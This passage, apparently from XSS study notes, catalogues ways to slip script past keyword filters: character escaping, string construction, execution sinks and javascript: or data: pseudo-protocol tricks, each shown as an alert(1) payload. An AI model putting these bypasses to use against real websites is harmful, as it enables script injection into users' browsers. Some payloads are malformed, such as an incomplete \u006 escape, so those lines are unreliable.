There are filters that focuses on blocking the user of certain keywords, such as `alert`, `javascript`, `eval`, etc...
## Character Escaping via Unicode
Here we see Unicode escaping without using native functions:
```javascript
<script>\u0061lert(1)</script>
<script>\u0061\u006\u0065\u0072\u0074(1)</script>
```
Here we see Unicode escaping using native functions.
```javascript
<script>eval("\u0061lert(1)")</script>
<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
```
## Character Escaping via Decimal, Octal, Hexadecimal
If the filtered vector is within a string, in addition to Unicode, there are multiple escapes we may adopt:
- `<img src=x onerror="\u0061lert(1)"/>`
- `<img src=x onerror="eval('\141lert(1)')"/>` using Octal escape
- `<img src=x onerror="eval('\x61lert(1)')"/>` using Hexadecimal escape
- `<img src=x onerror="&#x0061;lert(1)"/>` using Hexadecimal NCR
- `<img src=x onerror="&#97;lert(1)"/>` using Decimal NCR
- `<img src=x onerror="eval('\a\l\ert\(1\)')"/>` using Superfluous escapes characters
>Note: NCR means Numeric Character Reference

Finally, all character escaping can stay together, for example:
```txt
<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>
```
## Constructing Strings
Constructing strings can help in bypassing filters. For example, if the usual `alert` keyword is blocked, most likely `"ale"+"rt"` is note detected.

JavaScript has several functions useful to create strings:
```javascript
/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,116)
atob("YWxlcnQ=")
177985081..toString(36)
```
## Execution Sinks
Technically, functions that parse string as JavaScript code are called execution sinks, and JavaScript offers several alternatives. Below are some examples of sinks:
```javascript
setTimeout("JSCode") //all browsers
setInterval("JSCode") //all browsers
setImmediate("JSCode") //IE 10+
Function("JSCode") //all browsers
```
An interesting variation of the Function sink is:
```javascript
	[].constructor.constructor(alert(1))
    ^        ^          ^         ^
  object   array     Function   XSS Vector
```
## Pseudo-Protocols
Unofficial URI schemes, such as `javascript:` is commonly referred to as a pseudo-protocol. This specific pseudo-protocol is used to invoke JavaScript code within a link.
> Note: `javascript:` is not needed on event handlers, so we should avoid using it.

Typically the keyword `javascript:` is also commonly blocked, the following are some examples to bypass this:
- `object data="JaVaScRiPt:alert(1)">`
- `object data="javascript&colon;alert(1)">`
- `<object data="javascript&#x003A;alert(1)">`
- `<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">`

Additionally, there is also `data:`. For example:
- `<object data="data:text/html,<script>alert(1)</script>">`
- `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`

If `data:` is blocked, the following is an example of a bypass:
- `<embed code="DaTa:text/html,<script>alert(1)</script>">`
- `<embed code="data&#x003A;text/html,<script>alert(1)</script>">`